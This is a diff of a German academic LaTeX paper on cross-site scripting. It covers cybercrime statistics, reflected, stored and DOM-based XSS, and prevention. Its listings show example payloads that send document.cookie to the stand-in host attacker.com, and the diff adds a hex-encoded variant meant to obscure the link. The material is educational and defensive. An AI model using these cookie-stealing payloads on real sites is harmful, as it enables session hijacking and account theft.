@@ -1,7 +1,7 @@
 \section{Einleitung}
 \label{section:Einleitung}
 
-Laut der Business Data Plattform Statista\footnote{https://de.statista.com/themen/42/internet/} nutzen im Jahr 2018 rund 3,9 Milliarden Personen weltweit das Internet. Für das Jahr 2021 wurde prognostiziert, dass die Zahl der Internetnutzenden bis auf rund 4,14 Milliarden ansteigen wird. Im gleichen Ausmaß nahmen auch Cyberattacken zu.
+Laut der Business Data Plattform Statista\footnote{https://de.statista.com/themen/42/internet/} nutzten im Jahr 2018 rund 3,9 Milliarden Personen weltweit das Internet. Für das Jahr 2021 wurde prognostiziert, dass die Zahl der Internetnutzenden bis auf rund 4,14 Milliarden ansteigen wird. Im gleichen Ausmaß nahmen auch Cyberattacken zu.
 
 Laut Polizeilicher Kriminalstatistik von 2019 ist die Internetkriminalität in Österreich mit 28.439 Anzeigen um rund 45 Prozent gestiegen. Über die Hälfte der Anzeigen in diesem Bereich betrafen den Internetbetrug. Gleichzeitig ist hier die Aufklärungsquote mit knapp 38 Prozent im Vergleich zur durchschnittlichen Aufklärungsquote von 52,5\% weit niedriger. Während der Pandemie kam es außerdem zu einem Anstieg der Homeoffices, die Kommunikation sowohl intern als auch extern und mit Kundinnen und Kunden verlagerte sich verstärkt in den digitalen Bereich.  Der Leiter des Bundesministeriums für Inneres, Karl Nehammer, erklärte, dass 2020 die Zahl der Einbrüche Corona-bedingt rasant gesunken sei, Internet- und Betrugsdelikte dagegen massiv gestiegen seien.\footnote{https://www.derstandard.at/story/2000117361215/internetbetrug-steigt-vor-allem-mitten-in-der-pandemie}
 Die globale Pandemie von COVID-19 ist daher nicht nur ein ernstes Gesundheitsproblem, sondern auch ein Cybersicherheitsrisiko \autocite[12-17]{bundeskriminalamt2020}.
@@ -60,7 +60,7 @@ Der aktuelle Report von Accenture\footnote{https://www.accenture.com} ``Securing
 
 Zusätzlich erklären laut \textcite[17]{abbosh2019} in der Studie 59\% der Unternehmen, dass das Internet in Bezug auf die Cybersicherheit zunehmend instabiler werde, und sie sich nicht sicher seien, wie sie angemessen reagieren sollen. 86\% glauben, dass es neuere Ansätze brauchen würde, um die Cybersicherheit in ihren Unternehmen auf einen höheren Level zu bringen.  Die Bereitschaft etwas zu unternehmen und in Cybersicherheit zu investieren, ist also vorhanden, es herrscht jedoch eine große Unsicherheit darüber, in welche Bereiche sinnvoll investiert werden sollte.
 
-Eine aktuelle Studie des KFV, bei der 500 österreichische Unternehmen untersucht wurden, zeigt, dass 80 Prozent der befragten Klein- und Mittelunternehmen in den letzten Jahren zum Ziel von Cyberangriffen wurden. Pro Fall betrugen die wirtschaftlichen Schäden bis zu 150.000 Euro \autocite{kfv2019}.
+Eine aktuelle Studie des Kuratorium für Verkehrssicherheit (KFV), bei der 500 österreichische Unternehmen untersucht wurden, zeigt, dass 80 Prozent der befragten Klein- und Mittelunternehmen in den letzten Jahren zum Ziel von Cyberangriffen wurden. Pro Fall betrugen die wirtschaftlichen Schäden bis zu 150.000 Euro \autocite{kfv2019}.
 
 \subsection{Sicherheitslücken im Netz - Verteilung}
 \label{subsection:securityrisks_in_the_web}
@@ -95,7 +95,7 @@ Laut \textcite{kachel2008} besteht XSS einfach gesagt darin, dass ein Angreifend
 
 Durch eine Sicherheitslücke der Webanwendung auf Seiten des Clients oder des Servers gelingt es dem Angreifenden, seinen Schadcode in eine scheinbar vertrauenswürdige Umgebung einzubetten. Dazu wird vor allem JavaScript verwendet, da JavaScript unter den clientseitigen Skriptsprachen die größte Verbreitung hat. Es handelt sich dabei weniger um ein Sicherheitsproblem innerhalb von JavaScript, XSS nutzt die Sicherheitslücke in fehlerhaften Webanwendungen, um Daten auch aus nicht vertrauenswürdigen Quellen (z.B. aus Formulareingaben oder HTTP-Parametern) ungefiltert ins HTML einbauen. Das ermöglicht unter Anderem das Ändern der gesamten Seitenstruktur, das Installieren zusätzlicher JavaScript-Codes, das Erzeugen beliebiger HTML-Elemente, das Umleiten von Formularen und Links, das Auslesen von Authentifizierungs-Daten, das Senden und Empfangen von Daten und das Auslesen der Tastenanschläge \autocite[16]{wolf2012}.
 
-Wenn Webanwendungen (Support Chats beispielsweise) eingegebene Nutzerdaten ohne Überprüfung auf eventuell vorhandenen Skriptcodes an den Webbrowser weiterleiten, kann XSS dazu führen, dass schädlichen Skripte auf den Server gelangen. Von ist es möglich, dass die schädlichen Codes dann auch bei den betroffenen Clients landen. XSS kann außerdem harmlose Formulare (Kontaktformulare, Gästebücher) durch manipulierte Formulare ersetzen. Diese Formulare sammeln dann die Daten der Seitenbesucher. Manche Betreiber fühlen sich durch eine SSL-Verschlüsselung davor geschützt, wenn jedoch das Formular manipuliert ist, ist das nicht der Fall, da bei HTTPS lediglich die Verbindung zwischen Server und Client verschlüsselt wird. Wenn allerdings das Formular selbst manipuliert ist, hilft in diesem Fall auch eine verschlüsselte Verbindung nichts \autocite{schuring2017}.
+Wenn Webanwendungen (Support Chats beispielsweise) eingegebene Nutzerdaten ohne Überprüfung auf eventuell vorhandenen Skriptcodes an den Webbrowser weiterleiten, kann XSS dazu führen, dass schädlichen Skripte auf den Server gelangen. Von dort aus ist es möglich, dass die schädlichen Codes dann auch bei den betroffenen Clients landen. XSS kann außerdem harmlose Formulare (Kontaktformulare, Gästebücher) durch manipulierte Formulare ersetzen. Diese Formulare sammeln dann die Daten der Seitenbesucher. Manche Betreiber fühlen sich durch eine SSL-Verschlüsselung davor geschützt, wenn jedoch das Formular manipuliert ist, ist das nicht der Fall, da bei HTTPS lediglich die Verbindung zwischen Server und Client verschlüsselt wird. Wenn allerdings das Formular selbst manipuliert ist, hilft in diesem Fall auch eine verschlüsselte Verbindung nichts \autocite{schuring2017}.
 
 \subsection{Angriffsformen und deren Auswirkungen}
 \label{subsection:attack_forms_and_their_impact}
@@ -133,10 +133,9 @@ Die Angriffsform liegt schon im Namen, Eingaben, wie beispielsweise Suchanfragen
 
 Eine reflected XSS Attacke ist im Vergleich zu einer stored XSS Attacke in diesem Sinne anders, als dass sie von einer Web-Anwendung reflektiert wird, und nicht dauerhaft ist. Bei so einem Angriff wird der schadhafte JavaScript Code etwa nur durch einen Link ausgelöst.
 Um dies zu erreichen wird meist ein Link zu einer Web-Anwendung mit Schwachstellen erstellt, in welcher der schadhafte JavaScript Code in einer E-Mail oder in einem HTML form Element eingebunden wird. Um solche Schwachstelle in einer Web-Anwendung zu finden, wird beispielsweise in einem Suchfeld ausgeführt und untersucht, ob dieser JavaScript Code vom Web-Browser als solcher interpretiert und ausgeführt wird, oder nicht.
-Wird diese Popup ausgeführt, der Skripttext in der URL angezeigt oder wird im Web-Browser auf die Seite verwiesen und ein not found zurückgegeben, weiß der Angreifer, dass diese Seite anfällig ist \autocite[125]{gupta2015a}..
+Wird diese Popup ausgeführt, der Skripttext in der URL angezeigt oder wird im Web-Browser auf die Seite verwiesen und ein not found zurückgegeben, weiß der Angreifer, dass diese Seite anfällig ist \autocite[125]{gupta2015a}.
 
-Im nächsten Schritt erstellt er eine eigene URL und verpackt diese in einen Link, welcher in einem Forum oder einem sozialen Netzwerk geteilt wird. Obwohl die URL verdächtig ist, heißt es nicht, dass niemand diesen Link anklickt. Darüber hinaus kann ein Angreifer auch eine URL-Adresse erstellen, die ein Benutzer nicht direkt interpretieren kann. Der Angreifer wird also die Kodierungsschemata ausführen, um die ASCII-Zeichen in das Hexadezimalformat zu konvertieren, wie im Skript S5 gezeigt. Nun kann das Opfer die URL nicht interpretieren, die im Hexadezimalformat erstellt wurde, und es ist wahrscheinlicher, dass der Angreifer diese URL besuchen kann \autocite[125]{gupta2015a}.
-
+Im nächsten Schritt erstellt er eine eigene URL und verpackt diese in einen Link, welcher in einem Forum oder einem sozialen Netzwerk geteilt wird. Obwohl die URL verdächtig ist, heißt es nicht, dass niemand diesen Link anklickt. Darüber hinaus kann ein Angreifer auch eine URL-Adresse erstellen, die ein Benutzer nicht direkt interpretieren kann. Der Angreifer wird also die Kodierungsschemata ausführen, um die ASCII-Zeichen in das Hexadezimalformat zu konvertieren, wie in Listing \ref{reflected_xss_example} gezeigt. Nun kann das Opfer die URL nicht interpretieren, die im Hexadezimalformat erstellt wurde, und es ist wahrscheinlicher, dass der Angreifer diese URL besuchen kann \autocite[125]{gupta2015a}.
 
 \begin{lstlisting}[caption={Beispiel für reflected XSS Attacke},label=reflected_xss_example]
 /*
@@ -151,18 +150,20 @@ Hey user, check this out: "http://website.com/search?keyword=<script>window.loca
 		window.location='http://attacker.com/?cookie='+document.cookie
 	</script>
 	<tr> Table of Search Results
-	.
-	.
-	.
-	.
+	...
 	</tr>
 </html>
 
 GET "http://attacker.com/?cookie=user-cookie"
+
+/*
+	Alternative Variante mit kodierter URL
+*/
+Hey user, check this out: "http://website.com/search?keyword=3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%3d%2019%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%3f%63%6f%6f%6b%69%65%3d%2019%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e"
 \end{lstlisting}
 
 
-Wenn auch nur einer von tausenden Empfänger dieser E-Mail den Link klickt, ist Alice, die Täterin erfolgreich. Bob wird auf die Forumseite weitergeleitet, auf der der schadhafte JavaScript Code dann vom Web-Browser ausgeführt wird.
+Wenn auch nur einer von tausenden Empfänger dieser E-Mail den Link klickt, ist Bob, der Täter erfolgreich. Alice, die Nutzerin wird auf die Forumseite weitergeleitet, auf der der schadhafte JavaScript Code dann vom Web-Browser ausgeführt wird.
 
 \subsubsection{stored XSS – persistentes XSS}
 \label{subsubsection:stored_XSS}
@@ -205,7 +206,7 @@ Diese Art von XSS Angriff kann eine große Menge an Opfer finden, denn verteilt 
 \label{subsubsection:dom_xss}
 
 % IMAGE DOM-based XSS
-Erstmals beschrieben wurde DOM-basiertes XSS 2005 von Amit Klein. DOM XSS steht für Document Object Model basiertes cross-site scripting. Der Angriff spielt sich ausschließlich im Webbrowser ab, und im Unterschied zu Angriffen über reflektiertes oder persistentes XSS ist der schädliche Code kein Bestandteil der vom Server gelieferten HTML-Daten. Das macht es dem Server oder der Web Application Firewall unmöglich ihn zu erkennen. Diese Art von XSS ist dann möglich, wenn die Web-Anwendung Daten, welche nicht ordnungsgemäß behandelt werden, in das DOM schreibt.
+Erstmals beschrieben wurde DOM-basiertes XSS 2005 von Amit \textcite{klein2005}. DOM XSS steht für Document Object Model basiertes cross-site scripting. Der Angriff spielt sich ausschließlich im Webbrowser ab, und im Unterschied zu Angriffen über reflektiertes oder persistentes XSS ist der schädliche Code kein Bestandteil der vom Server gelieferten HTML-Daten. Das macht es dem Server oder der Web Application Firewall unmöglich ihn zu erkennen. Diese Art von XSS ist dann möglich, wenn die Web-Anwendung Daten, welche nicht ordnungsgemäß behandelt werden, in das DOM schreibt.
 Der Angreifer Bob kann die Daten der Web-Anwendung oder der Webseite mittels schadhaftem JavaScript Code manipulieren.  Ein typisches Beispiel einer solchen Attacke, kann wie folgt aussehen. Die Webseite http://website.com/search ist individuell vom der Suchanfrage abhängig. Diese ist kodiert in der URL und wird auf der Webseite direkt verwendet.
 
 \begin{figure}[ht]
@@ -216,7 +217,7 @@ Der Angreifer Bob kann die Daten der Web-Anwendung oder der Webseite mittels sch
 \end{figure}
 
 
-Ruft man die Seite \verb+http://website.com/search?keyword=XSS+ auf, resultiert dies in einer angepassten Begrüßung für Max. Ersetzt man jedoch den name Parameter mit einem Skript-tag und ruft \verb+http://website.com/search?keyword=<script>+ \verb+Evilfunction()</script>+ auf, sendet der Web-Browswer eine HTTP Anfrage an \verb+http://website.com+ und bekommt eine statische HTML Seite zurück. Der Web-Browser baut das DOM auf und füllt die Eigenschaft \verb+document.URL+ mit der URL, welche das Skript enthält.
+Ruft man die Seite \verb+http://website.com/search?keyword=XSS+ auf, resultiert dies in einer angepassten Suchanfrage für XSS. Ersetzt man jedoch den keyword Parameter mit einem Skript-tag und ruft \verb+http://website.com/search?keyword=<script>+ \verb+Evilfunction()</script>+ auf, sendet der Web-Browswer eine HTTP Anfrage an \verb+http://website.com+ und bekommt eine statische HTML Seite zurück. Der Web-Browser baut das DOM auf und füllt die Eigenschaft \verb+document.URL+ mit der URL, welche das Skript enthält.
 
 \begin{lstlisting}[caption={Beispiel für DOM-based XSS Attacke},label=dom_xss_example]
 Hey user, check this out: "http://website.com/search?keyword=<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
@@ -257,10 +258,10 @@ DOM-based XSS Attacken sind der Typ von XSS Angriffen, die im Document Object Mo
 	\item HTML DOM Referrer Objekt\newline Das Referrer Objekt ist document.referrer welches die URL des aktuell geladenen Dokuments represäntiert. In diesem Fall wird der Payload Teil im Referrer Header vom Server empfangen.
 \end{itemize}
 
-Wie auch bei Eilers\footnote{https://www.ceilers-news.de/serendipity/633-Cross-Site-Scripting-im-UEberblick,-Teil-4-DOM-basiertes-XSS.html} beschrieben ist der Client-seitige Code einer Webanwendung vor allem dann für DOM-basiertes XSS anfällig, wenn diese Daten aus vom Angreifer kontrollierbaren Objekten wie zum Beispiel \verb+document.location+, \verb+document.URL+ oder \verb+document.referrer+ oder lokale Eingaben im Web 2.0 ohne Prüfung auf eingeschleuste Codes verwendet.
+Wie auch bei \textcite{eilers2015a} beschrieben ist der Client-seitige Code einer Webanwendung vor allem dann für DOM-basiertes XSS anfällig, wenn diese Daten aus vom Angreifer kontrollierbaren Objekten wie zum Beispiel \verb+document.location+, \verb+document.URL+ oder \verb+document.referrer+ oder lokale Eingaben im Web 2.0\footnote{https://wirtschaftslexikon.gabler.de/definition/web-20-51842} ohne Prüfung auf eingeschleuste Codes verwendet werden.
 
 
-\section{Behebung und Prävention von XSS- Angriffen}
+\section{Prävention und Behebung von XSS-Angriffen}
 \label{section:prevention_of_xss_attacks}
 
 Wie es bei \textcite{kirda2009} im Abstract gut zusammengefasst ist, liegt die Herausforderung bei XSS Angriffen darin, dass diese zwar einfach installiert und angewandt werden können, es sich jedoch sehr schwierig gestalten kann diese zu entdecken und zu verhindern. Wörtlich heißt es im Paper:
@@ -273,7 +274,7 @@ Wie es bei \textcite{kirda2009} im Abstract gut zusammengefasst ist, liegt die H
 \end{quote}
 
 Das heißt, genau der Vorteil – die hohe Flexibilität von HTML-Codierungsschemata- bieten dem Angreifer viele Möglichkeiten, serverseitige Eingabefilter zu umgehen, die verhindern sollen, dass schädliche Skripte in vertrauenswürdige Sites eingefügt werden.
-Wie Carsten Eilers\footnote{https://www.ceilers-news.de/serendipity/696-Cross-Site-Scripting-verhindern,-ganz-allgemein.html} schon 2015 festgestellt hatte, könnte man natürlich in den Feldern, die für Benutzerinnen und Benutzer zur Verfügung gestellt werden, überhaupt kein HTML und damit JavaScript akzeptieren. Wenn die Eingabe nur Klartext enthalten darf, wird sie schon beim Auftauchen eines einzigen HTML-Tags abgelehnt. Diese einfache Lösung ist im Zeiten des Web 2.0\footnote{https://wirtschaftslexikon.gabler.de/definition/web-20-51842}, das auf der Mitwirkung der User abzielt, wird es deutlich schwieriger, erwünschte und unerwünschte Eingabe der Benutzenden auseinander zu halten. Aus Sicherheitsgründen lassen Webanwendungen daher als Alternative BB-Codes zu, die beim Export der akzeptierten Texte scheinbar gefahrlos in gültigen HTML-Code konvertiert werden können, oder fertigen Black- oder Whitelists an, um unerwünschte Eingaben zu vermeiden. Diese Arten der Prävention werden in den nächsten Unterpunkten erläutert und diskutiert.
+Wie Carsten \textcite{eilers2015} schon 2015 festgestellt hatte, könnte man natürlich in den Feldern, die für Benutzerinnen und Benutzer zur Verfügung gestellt werden, überhaupt kein HTML und damit JavaScript akzeptieren. Wenn die Eingabe nur Klartext enthalten darf, wird sie schon beim Auftauchen eines einzigen HTML-Tags abgelehnt. Diese einfache Lösung ist in Zeiten des Web 2.0, das auf der Mitwirkung der User abzielt, deutlich schwieriger, erwünschte und unerwünschte Eingabe der Benutzenden auseinander zu halten. Aus Sicherheitsgründen lassen Webanwendungen daher als Alternative BB-Codes zu, die beim Export der akzeptierten Texte scheinbar gefahrlos in gültigen HTML-Code konvertiert werden können, oder fertigen Black- oder Whitelists an, um unerwünschte Eingaben zu vermeiden. Diese Arten der Prävention werden in den nächsten Unterpunkten erläutert und diskutiert.
 
 \subsection{XSS Prävention: Alternative BB – Codes}
 \label{subsection:prevention_bb-codes}
